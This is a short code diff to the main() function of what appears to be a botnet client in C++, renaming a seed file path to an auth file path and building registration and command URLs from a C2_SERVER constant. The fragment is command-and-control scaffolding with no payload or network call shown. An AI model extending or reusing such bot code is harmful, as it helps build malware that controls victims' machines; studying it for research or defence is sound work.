@@ -5,11 +5,11 @@
 #include "bot.hh"
 
 int main() {
-    std::string register_url, command_url, seed_path, install_dir;
+    std::string register_url, command_url, authfile_path, install_dir;
 
     install_dir = util::GetInstallDir();
-    seed_path = install_dir + SEED_FILE;
-    Bot host(seed_path);
+    authfile_path = install_dir + AUTH_FILE;
+    Bot host(authfile_path);
 
     register_url = C2_SERVER + REGISTER_URI;
     command_url = C2_SERVER + CMD_URI;
